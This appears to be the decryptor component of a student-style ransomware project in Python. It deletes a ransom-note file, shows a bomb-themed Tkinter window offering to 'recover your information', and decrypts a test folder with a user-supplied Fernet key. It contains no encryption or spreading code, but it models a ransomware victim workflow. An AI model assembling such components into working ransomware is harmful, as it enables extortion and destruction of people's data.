from cryptography.fernet import Fernet  # Importa la clase Fernet del módulo cryptography para encriptar archivos
import os  # Importa el módulo os para trabajar con rutas de archivos y directorios
import tkinter as tk  # Importa el módulo tkinter para crear la interfaz gráfica
from tkinter import filedialog, messagebox  # Importa submódulos específicos de tkinter
from PIL import Image, ImageTk  # Importa clases de PIL (Python Imaging Library) para trabajar con imágenes

def cargar_key():
    file_path = filedialog.askopenfilename(title="Seleccionar archivo de clave")  # Abre un cuadro de diálogo para seleccionar el archivo de clave
    if file_path:
        with open(file_path, 'rb') as key_file:  # Abre el archivo de clave en modo lectura binaria
            return key_file.read()  # Retorna el contenido del archivo de clave
    else:
        return None

def decrypt(items, key):
    if key is None:
        messagebox.showerror("Error", "No se seleccionó ningún archivo de clave.")  # Muestra un mensaje de error si no se seleccionó ningún archivo de clave
        return

    f = Fernet(key)  # Crea una instancia de la clase Fernet con la clave
    for item in items:
        with open(item, 'rb') as file:  # Abre cada archivo en modo lectura binaria
            encrypted_data = file.read()  # Lee el contenido del archivo
        decrypted_data = f.decrypt(encrypted_data)  # Descifra los datos utilizando la clave
        with open(item, 'wb') as file:  # Abre cada archivo en modo escritura binaria
            file.write(decrypted_data)  # Escribe los datos descifrados en el archivo

    messagebox.showinfo("Recuperación de datos", "¡Felicidades! Tus datos han sido recuperados.")  # Muestra un mensaje informativo de recuperación exitosa

if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\vj\\Desktop\\ransom\\files'  # Ruta del directorio que contiene los archivos encriptados
    os.remove(os.path.join(path_to_encrypt, 'readme.txt'))  # Elimina el archivo 'readme.txt' dentro del directorio

    items = os.listdir(path_to_encrypt)  # Obtiene la lista de archivos dentro del directorio
    full_path = [os.path.join(path_to_encrypt, item) for item in items]  # Genera la lista completa de rutas de archivos

    window = tk.Tk()  # Crea una instancia de la ventana de la interfaz gráfica
    window.title("Recuperar Información")  # Establece el título de la ventana
    window.config(background='black')  # Establece el color de fondo de la ventana

    # Cargar la imagen
    image_path = "C:\\Users\\vja_2\\Desktop\\ransom\\bomm.png"  # Ruta de la imagen a mostrar (reemplaza con la ruta de tu imagen)
    image = Image.open(image_path)  # Abre la imagen
    image = image.resize((150, 150))  # Redimensiona la imagen
    photo = ImageTk.PhotoImage(image)  # Crea un objeto PhotoImage a partir de la imagen

    # Mostrar la imagen en un widget Label
    image_label = tk.Label(window, image=photo, bg='black')  # Crea un widget Label con la imagen y fondo negro
    image_label.pack(pady=20)  # Empaqueta el widget en la ventana con un espacio vertical

    label = tk.Label(window, text="¿Quieres recuperar tu información?", fg="white", bg="black", font=("Arial", 16))  # Crea un widget Label con texto
    label.pack(pady=10)  # Empaqueta el widget en la ventana con un espacio vertical

    def select_key_file():
        key = cargar_key()  # Llama a la función para seleccionar el archivo de clave
        decrypt(full_path, key)  # Llama a la función para descifrar los archivos con la clave seleccionada
        window.destroy()  # Cierra la ventana

    button = tk.Button(window, text="Continuar", command=select_key_file)  # Crea un botón con un comando asociado
    button.pack(pady=10)  # Empaqueta el botón en la ventana con un espacio vertical

    window.mainloop()  # Ejecuta el bucle principal de la interfaz gráfica
